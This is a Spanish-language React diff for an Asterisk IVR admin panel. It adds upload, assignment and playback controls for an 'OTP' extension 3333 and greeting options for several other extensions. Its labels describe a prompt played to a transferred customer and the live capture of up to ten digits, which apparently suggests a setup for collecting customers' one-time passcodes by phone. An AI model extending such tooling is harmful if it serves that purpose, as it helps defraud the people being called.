+                <UploadCloud className="w-6 h-6 text-emerald-400" />
+                <div className="text-xs font-bold text-white">Arrastra el audio de la 4444 aquí</div>
+                <p className="text-[10px] text-emerald-300/70 leading-tight">
+                  WAV o MP3. Se optimiza y activa en caliente en Asterisk al instante.
+                </p>
+              </div>
+            </div>
+          </div>
+        )}
+
+        {/* PANEL EXTENSIÓN 3333 */}
+        {(featuredExtTab === 'all' || featuredExtTab === '3333') && (
+          <div className="p-6 rounded-2xl bg-gradient-to-br from-pink-950/50 via-slate-900 to-slate-950 border-2 border-pink-500/50 shadow-xl space-y-4">
+            <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 pb-4 border-b border-pink-500/20">
+              <div className="flex items-start gap-3">
+                <div className="w-11 h-11 rounded-xl bg-pink-500/20 border border-pink-500/40 flex items-center justify-center text-pink-300 shrink-0 shadow-inner">
+                  <Headphones className="w-6 h-6" />
+                </div>
+                <div>
+                  <div className="flex items-center gap-2">
+                    <h3 className="text-base font-bold text-white">
+                      Audio Exclusivo para Extensión 3333 / 333
+                    </h3>
+                    <span className="px-2.5 py-0.5 rounded-full text-xs font-bold bg-pink-500 text-white shadow-sm">
+                      Extensión OTP 3333
+                    </span>
+                  </div>
+                  <p className="text-xs text-pink-200/80 mt-1">
+                    Audio reproducido al cliente cuando transfieres a la 3333: <span className="font-semibold text-white">Mismas características que la 7777 con locución independiente</span>.
+                  </p>
+                </div>
+              </div>
+
+              <div className="flex items-center gap-2 shrink-0">
+                <input
+                  type="file"
+                  ref={ext3333FileInputRef}
+                  onChange={(e) => {
+                    if (e.target.files && e.target.files[0]) {
+                      handleUpload3333Direct(e.target.files[0]);
+                    }
+                  }}
+                  accept="audio/*,.wav,.mp3,.ogg,.gsm"
+                  className="hidden"
+                />
+                <button
+                  onClick={() => ext3333FileInputRef.current?.click()}
+                  disabled={isUploading3333}
+                  className="inline-flex items-center space-x-2 px-5 py-2.5 rounded-xl text-sm font-bold bg-pink-500 hover:bg-pink-400 text-white shadow-lg shadow-pink-500/30 transition-all transform active:scale-95 disabled:opacity-50"
+                >
+                  <UploadCloud className="w-4 h-4" />
+                  <span>{isUploading3333 ? 'Subiendo y Activando...' : 'Cargar Audio para Extensión 3333'}</span>
+                </button>
+              </div>
+            </div>
+
+            {/* Zona de estado y selector rápido para la 3333 */}
+            <div className="grid grid-cols-1 lg:grid-cols-3 gap-4 pt-1">
+              <div className="lg:col-span-2 p-4 rounded-xl bg-slate-950/80 border border-pink-500/30 space-y-2.5">
+                <div className="flex items-center justify-between text-xs">
+                  <span className="text-slate-300 font-semibold">Audio asignado a la 3333 / 333:</span>
+                  <span className="font-mono text-pink-300 font-bold bg-pink-950/60 px-2 py-0.5 rounded border border-pink-800/50">
+                    {activeAssignments.welcome_3333 || 'custom/bienvenida_3333'}
+                  </span>
+                </div>
+
+                <div className="flex items-center gap-2">
+                  <select
+                    value={activeAssignments.welcome_3333 || 'custom/bienvenida_3333'}
+                    disabled={isSyncingRole.welcome_3333}
+                    onChange={(e) => handleAssignRoleDirect('welcome_3333', e.target.value)}
+                    className="flex-1 px-3 py-2 rounded-lg bg-slate-900 border border-pink-500/40 text-slate-100 text-xs font-mono focus:border-pink-400 focus:outline-none"
+                  >
+                    {audios.map((a) => (
+                      <option key={a.id} value={a.asteriskPath}>
+                        {a.name} ({a.asteriskPath})
+                      </option>
+                    ))}
+                  </select>
+
+                  <button
+                    onClick={() => handlePlayByPath(activeAssignments.welcome_3333 || 'custom/bienvenida_3333')}
+                    className="px-3.5 py-2 rounded-lg bg-pink-600 hover:bg-pink-500 text-white text-xs font-semibold flex items-center gap-1.5 shadow-md shadow-pink-600/20"
+                    title="Escuchar audio actual de la 3333"
+                  >
+                    <Play className="w-3.5 h-3.5" />
+                    <span>Escuchar</span>
+                  </button>
+
+                  <button
+                    onClick={() => handleDeactivateRole('welcome_3333')}
+                    disabled={isSyncingRole.welcome_3333}
+                    className="px-2.5 py-2 rounded-lg bg-slate-800 hover:bg-rose-950/40 text-slate-400 hover:text-rose-400 border border-slate-700 hover:border-rose-500/30 text-xs font-semibold flex items-center gap-1"
+                    title="Desactivar audio actual y restaurar locución predeterminada para la 3333"
+                  >
+                    <PowerOff className="w-3.5 h-3.5" />
+                    <span className="hidden sm:inline">Desactivar</span>
+                  </button>
+                </div>
+
+                <div className="flex items-center justify-between text-[11px] text-slate-400">
+                  <span className="flex items-center gap-1.5 text-emerald-400">
+                    <CheckCircle2 className="w-3.5 h-3.5" />
+                    <span>AstDB: ivr_vars 3333_intro y ivr_vars 3333_prompt</span>
+                  </span>
+                  <span className="text-slate-400">Captura hasta 10 dígitos + tecla #</span>
+                </div>
+              </div>
+
+              <div
+                onDragOver={(e) => {
+                  e.preventDefault();
+                  setIsDragging(true);
+                }}
+                onDragLeave={() => setIsDragging(false)}
+                onDrop={(e) => {
+                  e.preventDefault();
+                  setIsDragging(false);
+                  if (e.dataTransfer.files && e.dataTransfer.files[0]) {
+                    handleUpload3333Direct(e.dataTransfer.files[0]);
+                  }
+                }}
+                onClick={() => ext3333FileInputRef.current?.click()}
+                className="p-4 rounded-xl border-2 border-dashed border-pink-500/40 bg-pink-950/20 hover:bg-pink-950/40 hover:border-pink-400 transition-all flex flex-col items-center justify-center text-center cursor-pointer space-y-1.5"
+              >
+                <UploadCloud className="w-6 h-6 text-pink-400" />
+                <div className="text-xs font-bold text-white">Arrastra el audio de la 3333 aquí</div>
+                <p className="text-[10px] text-pink-300/70 leading-tight">
+                  WAV o MP3. Se optimiza y activa en caliente en Asterisk al instante.
+                </p>
+              </div>
+            </div>
+          </div>
+        )}
       </div>
 
       {/* SECTION 2: MATRIZ DE ASIGNACIÓN EN VIVO (CAMBIAR AUDIOS EN 1 CLIC) */}
@@ -1113,7 +1757,7 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
                   : 'text-slate-400 hover:text-slate-200'
               }`}
             >
-              Ext 7777 / 6666 / OTP (6)
+              Exts OTP (9)
             </button>
             <button
               onClick={() => setFilterCategory('press1')}
@@ -1605,6 +2249,10 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
                   className="w-full px-3 py-2 rounded-md bg-slate-950 border border-slate-800 text-white focus:border-emerald-500 focus:outline-none text-xs"
                 >
                   <option value="welcome_7777">Bienvenida Extensión 7777 (Captura en Vivo)</option>
+                  <option value="welcome_6666">Bienvenida Extensión 6666 (Captura en Vivo)</option>
+                  <option value="welcome_5555">Bienvenida Extensión 5555 (Captura en Vivo)</option>
+                  <option value="welcome_4444">Bienvenida Extensión 4444 (Captura en Vivo)</option>
+                  <option value="welcome_3333">Bienvenida Extensión 3333 (Captura en Vivo)</option>
                   <option value="press1_welcome">Bienvenida IVR Press 1 (Al contestar llamada)</option>
                   <option value="agent_transfer">Transferencia a Asesor ("Un momento por favor...")</option>
                   <option value="press1_invalid">Opción Inválida en Menú Press 1</option>
